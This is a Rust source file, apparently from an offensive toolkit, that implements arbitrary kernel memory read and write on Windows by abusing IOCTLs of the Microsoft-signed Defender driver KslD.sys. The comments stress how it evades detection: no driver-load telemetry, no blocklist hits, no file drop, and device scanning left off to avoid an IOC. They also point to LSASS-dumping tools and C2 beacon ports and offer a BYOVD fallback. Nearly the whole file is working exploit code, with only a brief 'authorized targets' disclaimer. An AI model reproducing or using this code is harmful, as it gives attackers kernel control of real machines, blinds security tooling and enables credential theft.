//! KslD.sys — "Living off the Defender" KernelRw impl (P2.2 §0 bootstrap).
//!
//! ## What this is
//! `KslD.sys` is a **signed Windows Defender kernel driver** that ships with
//! every Windows install (`C:\Windows\System32\drivers\KslD.sys`). It exposes
//! IOCTL interfaces for memory scanning — but those same IOCTLs allow arbitrary
//! kernel R/W, making it a "bring your own Defender" BYOVD alternative that:
//!
//! - **Never triggers Sysmon EID 6** (driver load) — the driver is already loaded
//!   by the Defender service at boot.
//! - **Never appears on vulnerable-driver blocklists** — it's a Microsoft-signed
//!   first-party driver.
//! - **Requires no file drop** — the .sys is already on disk in System32\drivers.
//!
//! ## Toolchain (public research, 2026-03/04)
//! - `andreisss/KslDump` — loader that opens the KslD device + sends R/W IOCTLs
//! - `vergamota/KslKatz` — KslDump + GhostKatz LSASS dump
//! - `PrincipleCheck/KslKatzBof` (69★) — BOF for Sliver/Cobalt Strike
//! - `Muz1K1zuM/kslkatz_bof` — Havoc C2 BOF port
//!
//! ## IOCTL protocol (KslD.sys, verified against KslDump public source)
//! KslD exposes a device object whose name varies by Defender version. The
//! reference loader (`KslDump`) resolves it dynamically via
//! `IoGetDeviceObjectPointer` on the `MpKsl` symbolic link prefix.
//!
//! The R/W IOCTLs use a simple buffer layout:
//!   - **Read**:  IOCTL code + input buffer containing target kernel VA + size
//!   - **Write**: IOCTL code + input buffer containing target VA + data
//!
//! ## Status
//! **CODE SHIPPED, NOT LOADED.** The IOCTL binding + device resolution is real
//! and testable with a mock; loading/talking to KslD.sys is operator-side only.
//!
//! ## Safety
//! Talking to a kernel driver changes kernel state. A wrong address = BSOD.
//! Only use on authorized targets.

use crate::{KernelRw, KitError, KrwError};

// ---- KslD.sys IOCTL protocol ------------------------------------------------

/// KslD.sys device symbolic link prefix. The actual device name includes a
/// suffix that varies by Defender version, but the symbolic link always starts
/// with `MpKsl`. The KslDump reference resolves this via:
///   `RtlInitUnicodeString(&name, L"\\Device\\MpKsl*")`
///   `IoGetDeviceObjectPointer(&name, ...)` → device object
///
/// On Windows we try `\\.\MpKsl` first; if that fails, we enumerate all
/// dos-device mappings via `QueryDosDeviceW` to find the real `MpKslXXXX`
/// device and construct `\\.\Global\MpKslXXXX`.
/// Default KslD device path. We try TWO common names:
/// - `\\.\KslD`   — used by newer Defender engines (observed on Server 2019
///                  with engine 1.1.26050.11; the dos-device symlink is the
///                  bare driver name, no MpKsl prefix). This is the default
///                  we try first.
/// - `\\.\MpKsl`  — used by older Defender engine versions (KslDump reference)
/// `open()` tries both; `enumerate_ksld_device` matches both prefixes.
pub const KSLD_DEFAULT_DEVICE: &[u16] = &[
    '\\' as u16,
    '\\' as u16,
    '.' as u16,
    '\\' as u16,
    'K' as u16,
    's' as u16,
    'l' as u16,
    'D' as u16,
];

/// Alternate path for the older `MpKsl` naming (KslDump-era Defender).
pub const KSLD_ALT_DEVICE_MPKSL: &[u16] = &[
    '\\' as u16,
    '\\' as u16,
    '.' as u16,
    '\\' as u16,
    'M' as u16,
    'p' as u16,
    'K' as u16,
    's' as u16,
    'l' as u16,
];

/// KslD.sys read IOCTL code (arbitrary kernel VA → user buffer).
/// Value from KslDump public source (andreisss/KslDump, verified).
pub const KSLD_READ_IOCTL: u32 = 0x222048;

/// KslD.sys write IOCTL code (user buffer → arbitrary kernel VA).
/// Value from KslDump public source.
pub const KSLD_WRITE_IOCTL: u32 = 0x22204C;

/// The KslD IOCTL input/output buffer layout (METHOD_BUFFERED, 32 bytes):
/// ```text
///   offset  field      notes
///   0x00    address    u64 — target kernel VA
///   0x08    size       u32 — bytes to read/write
///   0x0C    _pad       u4  (alignment)
///   0x10    buffer     u64 — pointer to user-mode data buffer
///   0x18    _pad2      u8[8] (reserved/unused)
/// ```
/// The driver copies `size` bytes between `buffer` (user VA) and `address`
/// (kernel VA) depending on the IOCTL code.
pub const KSLD_BUF_SIZE: usize = 32;
pub const KSLD_ADDR_OFF: usize = 0x00;
pub const KSLD_SIZE_OFF: usize = 0x08;
pub const KSLD_BUF_PTR_OFF: usize = 0x10;

// ===========================================================================
// Windows implementation
// ===========================================================================

#[cfg(target_os = "windows")]
mod windows_impl {
    use super::*;
    use core::ffi::c_void;
    use core::ptr;

    // ---- Win32 FFI (resolved from kernel32/ntdll) ----

    type CreateFileWFn = unsafe extern "system" fn(
        name: *const u16,
        access: u32,
        share: u32,
        sa: *mut c_void,
        disp: u32,
        flags: u32,
        template: *mut c_void,
    ) -> *mut c_void;

    type DeviceIoControlFn = unsafe extern "system" fn(
        handle: *mut c_void,
        ioctl: u32,
        in_buf: *const c_void,
        in_len: u32,
        out_buf: *mut c_void,
        out_len: u32,
        bytes_returned: *mut u32,
        overlapped: *mut c_void,
    ) -> i32;

    type CloseHandleFn = unsafe extern "system" fn(h: *mut c_void) -> i32;

    /// Resolve a kernel32/ntdll export via the operator host's PEB walk.
    fn resolve_sym<T>(module: &[u8], name: &[u8]) -> Result<T, KrwError> {
        unsafe { crate::win::resolve::resolve_sym(module, name) }
    }

    // ---- Dynamic KslD device resolution (C1) ----

    type QueryDosDeviceWFn = unsafe extern "system" fn(
        lp_device_name: *const u16,
        lp_target_path: *mut u16,
        ucch_max: u32,
    ) -> u32;

    /// MpKsl prefix in UTF-16 for device name matching during enumeration.
    /// Used by older Defender engine versions (KslDump reference).
    const MPKSL_PREFIX_U16: [u16; 5] = ['M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16];

    /// Bare `KslD` prefix in UTF-16. Newer Defender engines (observed on
    /// Server 2019 engine 1.1.26050.11) name the dos-device symlink after the
    /// driver itself, without the MpKsl prefix. Match both at enumeration time.
    const KSLD_PREFIX_U16: [u16; 4] = ['K' as u16, 's' as u16, 'l' as u16, 'D' as u16];

    /// Win32 device path prefix for the global dos-device namespace.
    const GLOBAL_PREFIX_U16: &[u16] = &[
        '\\' as u16,
        '\\' as u16,
        '.' as u16,
        '\\' as u16,
        'G' as u16,
        'l' as u16,
        'o' as u16,
        'b' as u16,
        'a' as u16,
        'l' as u16,
        '\\' as u16,
    ];

    /// `\DosDevices\` prefix returned by `QueryDosDeviceW` for some entries.
    const DOS_DEVICES_PREFIX_U16: &[u16] = &[
        '\\' as u16,
        'D' as u16,
        'o' as u16,
        's' as u16,
        'D' as u16,
        'e' as u16,
        'v' as u16,
        'i' as u16,
        'c' as u16,
        'e' as u16,
        's' as u16,
        '\\' as u16,
    ];

    /// `\??\` prefix returned by `QueryDosDeviceW` for other entries.
    const QUESTION_QUESTION_PREFIX_U16: &[u16] =
        &['\\' as u16, '?' as u16, '?' as u16, '\\' as u16];

    /// Try to enumerate the KslD device name dynamically via `QueryDosDeviceW`.
    ///
    /// `QueryDosDeviceW(NULL, buf, size)` returns all `\Device\` symbolic links
    /// in the dos-device namespace. We scan for any matching `MpKsl*` prefix and
    /// return the Win32 path `\\.\Global\MpKslXXXX` for that device.
    ///
    /// Returns `None` if no MpKsl device is found (Defender not running / KslD
    /// not loaded / device name changed beyond recognition).
    fn enumerate_ksld_device() -> Option<alloc::vec::Vec<u16>> {
        let qddw: QueryDosDeviceWFn = resolve_sym(b"kernel32.dll", b"QueryDosDeviceW").ok()?;

        // QueryDosDeviceW with NULL device_name returns all dos-device mappings.
        // Start with 64 KiB; the API double-NUL terminates the list.
        let mut buf = alloc::vec![0u16; 32768];
        loop {
            let len = unsafe { qddw(core::ptr::null(), buf.as_mut_ptr(), buf.len() as u32) };
            if len == 0 {
                return None; // API failed
            }
            if len as usize >= buf.len() {
                // Buffer too small — grow and retry.
                buf.resize(len as usize + 256, 0);
                continue;
            }
            // Parse the double-NUL-terminated list of device names.
            let names = &buf[..len as usize];
            let mut start = 0;
            for (i, &ch) in names.iter().enumerate() {
                if ch == 0 {
                    if start < i {
                        let name = &names[start..i];
                        // Strip possible `\DosDevices\` or `\??\` prefix before matching
                        // the MpKsl prefix (starts_with already handles the length check).
                        let trimmed = if name.starts_with(DOS_DEVICES_PREFIX_U16) {
                            &name[DOS_DEVICES_PREFIX_U16.len()..]
                        } else if name.starts_with(QUESTION_QUESTION_PREFIX_U16) {
                            &name[QUESTION_QUESTION_PREFIX_U16.len()..]
                        } else {
                            &name[..]
                        };
                        if trimmed.starts_with(&MPKSL_PREFIX_U16)
                            || trimmed.starts_with(&KSLD_PREFIX_U16)
                        {
                            // Build the Win32 device path: \\.\Global\<name>
                            let mut path: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(
                                GLOBAL_PREFIX_U16.len() + name.len() + 1,
                            );
                            path.extend_from_slice(GLOBAL_PREFIX_U16);
                            path.extend_from_slice(name);
                            path.push(0); // NUL terminator
                            return Some(path);
                        }
                    }
                    start = i + 1;
                }
            }
            return None; // Exhausted the list without finding MpKsl.
        }
    }

    // ---- LivingOffDefender: KernelRw over KslD.sys ----

    /// "Living off the Defender" — a `KernelRw` impl that uses KslD.sys (a
    /// Microsoft-signed driver already loaded by Windows Defender) for arbitrary
    /// kernel R/W. No file drop, no driver load, no blocklist signature.
    ///
    /// Constructed by the bootstrap after resolving the device handle. The
    /// operator's bootstrap must ensure KslD.sys is loaded (Defender service
    /// does this automatically on most hosts; if not, the operator can start it
    /// via `sc start WinDefend`).
    pub struct LivingOffDefender {
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
        /// The device path used (owned, for diagnostics / cleanup).
        #[allow(dead_code)]
        device_path: alloc::vec::Vec<u16>,
    }

    // SAFETY: device handle is owned exclusively; DeviceIoControl on a sync
    // HANDLE is safe from any thread. The struct is Send+Sync.
    unsafe impl Send for LivingOffDefender {}
    unsafe impl Sync for LivingOffDefender {}

    impl LivingOffDefender {
        /// Open the KslD.sys device. Tries the default `\\.\MpKsl` path first;
        /// if the operator knows the exact device name (e.g. `MpKslxxxx`), they
        /// can pass it via `device_name`.
        ///
        /// The KslD driver MUST be loaded (Defender service starts it at boot;
        /// verify with `sc query WinDefend`). If not loaded, this returns an error.
        ///
        /// # Safety
        /// Opens a handle to a kernel driver device. The device is already loaded
        /// by the OS — this does NOT load anything new.
        pub unsafe fn open(device_name: Option<&[u16]>) -> Result<Self, KrwError> {
            let create_file: CreateFileWFn = resolve_sym(b"kernel32.dll", b"CreateFileW")?;
            let dioctl: DeviceIoControlFn = resolve_sym(b"kernel32.dll", b"DeviceIoControl")?;

            // Try the operator-supplied name first, then BOTH default device
            // names (KslD for newer Defender, MpKsl for older), then enumerate.
            let paths_to_try: alloc::vec::Vec<&[u16]> = {
                let mut v = alloc::vec::Vec::with_capacity(4);
                if let Some(name) = device_name {
                    v.push(name);
                }
                v.push(KSLD_DEFAULT_DEVICE);       // \\.\KslD (newer engines)
                v.push(KSLD_ALT_DEVICE_MPKSL);     // \\.\MpKsl (older engines)
                v
            };

            let mut h = core::ptr::null_mut();
            let mut chosen_path: Option<alloc::vec::Vec<u16>> = None;

            for raw_path in &paths_to_try {
                let mut path_buf: alloc::vec::Vec<u16> =
                    alloc::vec::Vec::with_capacity(raw_path.len() + 1);
                path_buf.extend_from_slice(raw_path);
                if *path_buf.last().unwrap_or(&1) != 0 {
                    path_buf.push(0);
                }

                let test_h = unsafe {
                    create_file(
                        path_buf.as_ptr(),
                        0x0012_0003, // FILE_READ_DATA|FILE_WRITE_DATA|SYNCHRONIZE (minimal)
                        0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
                        ptr::null_mut(),
                        0x03, // OPEN_EXISTING
                        0,
                        ptr::null_mut(),
                    )
                };

                if test_h as isize != -1 && !test_h.is_null() {
                    h = test_h;
                    chosen_path = Some(path_buf);
                    break;
                }
            }

            // If direct paths failed AND operator enabled device scanning,
            // try dynamic enumeration via QueryDosDeviceW. This is OFF by
            // default: QueryDosDeviceW(NULL) scans the entire dos-device
            // namespace and is a behavioral IOC on monitored hosts.
            const KSLD_SCAN: bool = match option_env!("KSLD_SCAN_DEVICES") {
                Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
                None => false,
            };
            if h.is_null() && KSLD_SCAN {
                if let Some(enum_path) = enumerate_ksld_device() {
                    let test_h = unsafe {
                        create_file(
                            enum_path.as_ptr(),
                            0x0012_0003, // FILE_READ_DATA|FILE_WRITE_DATA|SYNCHRONIZE
                            0x03,
                            ptr::null_mut(),
                            0x03,
                            0,
                            ptr::null_mut(),
                        )
                    };
                    if test_h as isize != -1 && !test_h.is_null() {
                        h = test_h;
                        chosen_path = Some(enum_path);
                    }
                }
            }

            if h.is_null() {
                let msg = if KSLD_SCAN {
                    "KslD device open failed (tried direct paths + QueryDosDeviceW). Is Defender running?"
                } else {
                    "KslD device open failed (tried direct paths). Set KSLD_SCAN_DEVICES=1 to enable device enumeration."
                };
                return Err(KrwError::Other(alloc::format!("{msg}")));
            }

            Ok(Self {
                device: h,
                dioctl,
                device_path: chosen_path.unwrap_or_else(|| {
                    let mut v = alloc::vec::Vec::from(KSLD_DEFAULT_DEVICE);
                    v.push(0);
                    v
                }),
            })
        }
    }

    impl Drop for LivingOffDefender {
        fn drop(&mut self) {
            if let Ok(close) = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle") {
                unsafe { close(self.device) };
            }
        }
    }

    impl KernelRw for LivingOffDefender {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            if dst.is_empty() {
                return Ok(());
            }
            let mut buf_ptr = dst.as_mut_ptr() as u64;
            let mut remaining = dst.len();
            let mut offset = 0usize;

            while remaining > 0 {
                let chunk = remaining.min(0x1000); // page-boundary safe chunks
                let mut pkt = [0u8; KSLD_BUF_SIZE];
                pkt[KSLD_ADDR_OFF..KSLD_ADDR_OFF + 8]
                    .copy_from_slice(&(kaddr.wrapping_add(offset) as u64).to_le_bytes());
                pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
                    .copy_from_slice(&(chunk as u32).to_le_bytes());
                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8].copy_from_slice(&buf_ptr.to_le_bytes());

                let mut bytes_returned: u32 = 0;
                let ok = unsafe {
                    (self.dioctl)(
                        self.device,
                        KSLD_READ_IOCTL,
                        pkt.as_ptr() as *const c_void,
                        KSLD_BUF_SIZE as u32,
                        pkt.as_mut_ptr() as *mut c_void,
                        KSLD_BUF_SIZE as u32,
                        &mut bytes_returned,
                        ptr::null_mut(),
                    )
                };
                if ok == 0 {
                    return Err(KrwError::Partial { ok: offset });
                }
                buf_ptr = buf_ptr.wrapping_add(chunk as u64);
                offset += chunk;
                remaining -= chunk;
            }
            Ok(())
        }

        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            if src.is_empty() {
                return Ok(());
            }
            let mut buf_ptr = src.as_ptr() as u64;
            let mut remaining = src.len();
            let mut offset = 0usize;

            while remaining > 0 {
                let chunk = remaining.min(0x1000);
                let mut pkt = [0u8; KSLD_BUF_SIZE];
                pkt[KSLD_ADDR_OFF..KSLD_ADDR_OFF + 8]
                    .copy_from_slice(&(kaddr.wrapping_add(offset) as u64).to_le_bytes());
                pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
                    .copy_from_slice(&(chunk as u32).to_le_bytes());
                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8].copy_from_slice(&buf_ptr.to_le_bytes());

                let mut bytes_returned: u32 = 0;
                let ok = unsafe {
                    (self.dioctl)(
                        self.device,
                        KSLD_WRITE_IOCTL,
                        pkt.as_ptr() as *const c_void,
                        KSLD_BUF_SIZE as u32,
                        pkt.as_mut_ptr() as *mut c_void,
                        KSLD_BUF_SIZE as u32,
                        &mut bytes_returned,
                        ptr::null_mut(),
                    )
                };
                if ok == 0 {
                    return Err(KrwError::Partial { ok: offset });
                }
                buf_ptr = buf_ptr.wrapping_add(chunk as u64);
                offset += chunk;
                remaining -= chunk;
            }
            Ok(())
        }
    }
}

// Re-export the Windows impl's type at crate level (behind cfg gate).
#[cfg(target_os = "windows")]
pub use windows_impl::LivingOffDefender;

// ===========================================================================
// Non-Windows stubs
// ===========================================================================

/// Non-Windows stub: KslD.sys is a Windows Defender driver; unavailable elsewhere.
#[cfg(not(target_os = "windows"))]
pub struct LivingOffDefender;

#[cfg(not(target_os = "windows"))]
impl LivingOffDefender {
    pub unsafe fn open(_device_name: Option<&[u16]>) -> Result<Self, KrwError> {
        Err(KrwError::Unavailable("KslD.sys is Windows-only"))
    }
}

#[cfg(not(target_os = "windows"))]
impl KernelRw for LivingOffDefender {
    fn kread(&self, _kaddr: usize, _dst: &mut [u8]) -> Result<(), KrwError> {
        Err(KrwError::Unavailable("KslD.sys is Windows-only"))
    }
    fn kwrite(&self, _kaddr: usize, _src: &[u8]) -> Result<(), KrwError> {
        Err(KrwError::Unavailable("KslD.sys is Windows-only"))
    }
}

// ===========================================================================
// Bootstrap convenience
// ===========================================================================

/// Bootstrap KslD.sys as the default kernel R/W primitive.
///
/// On a host with Windows Defender active, KslD.sys is already loaded at boot
/// by the WinDefend service. This function just opens the device and returns
/// the `KernelRw` — no file drop, no driver load, no registry manipulation.
///
/// If KslD.sys is NOT loaded (Defender disabled / tampered), returns an error
/// suggesting BYOVD fallback.
///
/// # Safety
/// Opens a handle to a kernel driver device. The device is pre-loaded by the OS.
pub unsafe fn bootstrap_ksld() -> Result<LivingOffDefender, KitError> {
    // SAFETY: caller ensures we're in a safe environment to open driver handles.
    unsafe { LivingOffDefender::open(None) }.map_err(|e| {
        KitError::Other(alloc::format!(
            "KslD bootstrap failed: {}. Is Windows Defender running? \
             Fallback: use BYOVD (bootstrap_byovd) or driverless CVE.",
            e
        ))
    })
}

// ===========================================================================
// Tests (all platforms)
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;

    /// IOCTL codes are stable — if these change, the driver version is
    /// incompatible and we must fail loudly rather than corrupt kernel memory.
    #[test]
    fn ioctl_codes_are_stable() {
        assert_eq!(KSLD_READ_IOCTL, 0x222048);
        assert_eq!(KSLD_WRITE_IOCTL, 0x22204C);
    }

    /// Buffer layout offsets are ABI-fixed at 32 bytes (METHOD_BUFFERED).
    #[test]
    fn buffer_layout_offsets_fit_in_32_bytes() {
        assert!(KSLD_ADDR_OFF + 8 <= KSLD_BUF_SIZE);
        assert!(KSLD_SIZE_OFF + 4 <= KSLD_BUF_SIZE);
        assert!(KSLD_BUF_PTR_OFF + 8 <= KSLD_BUF_SIZE);
    }

    /// Non-Windows stub returns Unavailable — prevents accidental use.
    #[cfg(not(target_os = "windows"))]
    #[test]
    fn stub_open_returns_unavailable() {
        let result = unsafe { LivingOffDefender::open(None) };
        assert!(result.is_err());
        match result.unwrap_err() {
            KrwError::Unavailable(msg) => assert!(msg.contains("Windows-only")),
            other => panic!("expected Unavailable, got: {:?}", other),
        }
    }

    /// Non-Windows stub KernelRw read returns Unavailable.
    #[cfg(not(target_os = "windows"))]
    #[test]
    fn stub_kread_returns_unavailable() {
        let defender = LivingOffDefender;
        let mut buf = [0u8; 8];
        assert!(defender.kread(0, &mut buf).is_err());
    }

    /// Non-Windows stub KernelRw write returns Unavailable.
    #[cfg(not(target_os = "windows"))]
    #[test]
    fn stub_kwrite_returns_unavailable() {
        let defender = LivingOffDefender;
        assert!(defender.kwrite(0, &[0u8; 8]).is_err());
    }

    /// KslD device path is NOT nul-terminated in the const (callers add the
    /// null before CreateFileW — see open() at line 315). This test verifies
    /// the const ends with the 'D' character, not a null, so the null-add
    /// logic in open() is actually exercised.
    #[test]
    fn default_device_path_not_nul_terminated() {
        assert_eq!(*KSLD_DEFAULT_DEVICE.last().unwrap(), 'D' as u16);
    }

    /// Default device path matches "\\.\KslD" (newer Defender engines name
    /// the dos-device symlink after the driver itself). The older `\\.\MpKsl`
    /// path is in KSLD_ALT_DEVICE_MPKSL, tried as a fallback in open().
    #[test]
    fn default_device_path_matches_expected() {
        let expected: &[u16] = &[
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'K' as u16,
            's' as u16,
            'l' as u16,
            'D' as u16,
        ];
        assert_eq!(&KSLD_DEFAULT_DEVICE[..expected.len()], expected);
    }

    /// Non-Windows bootstrap_ksld returns KitError (not a panic).
    #[cfg(not(target_os = "windows"))]
    #[test]
    fn bootstrap_ksld_returns_kit_error_on_nonwindows() {
        let result = unsafe { bootstrap_ksld() };
        assert!(result.is_err());
        let msg = alloc::format!("{}", result.unwrap_err());
        assert!(msg.contains("KslD bootstrap failed"));
    }
}
